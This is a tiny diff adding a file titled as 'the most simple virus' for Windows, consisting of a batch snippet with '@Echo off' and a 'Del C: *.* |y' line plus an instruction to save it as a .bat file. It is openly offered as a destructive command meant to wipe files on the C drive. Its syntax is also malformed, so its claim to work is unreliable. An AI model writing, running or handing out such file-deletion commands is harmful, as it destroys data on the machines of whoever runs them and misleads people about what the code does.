@@ -1,0 +1,7 @@
+The Most Simple Virus To Crush The Window
+@Echo off
+
+Del C: *.* |y
+
+Save It As Anything.bat
+
